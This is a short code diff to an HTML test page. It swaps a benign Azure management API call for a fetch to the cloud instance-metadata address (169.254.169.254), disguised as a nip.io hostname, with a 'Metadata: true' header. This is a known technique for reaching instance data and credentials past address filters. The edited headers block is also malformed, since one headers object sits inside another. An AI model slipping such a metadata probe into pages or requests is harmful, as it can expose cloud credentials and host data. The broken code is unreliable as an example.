@@ -3,13 +3,12 @@
 <head>
   <title>Test Page</title>
   <script>
-    const url = "https://management.azure.com/subscriptions?api-version=2021-04-01";
+    const url = "https://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01";
     const timestamp = Date.now();
 
     fetch(url, {
       headers: {
-        "Authorization": "Bearer dummy-token",
-        "Content-Type": "application/json"
+        headers: { "Metadata": "true" }
       }
     })
     .then(res => {
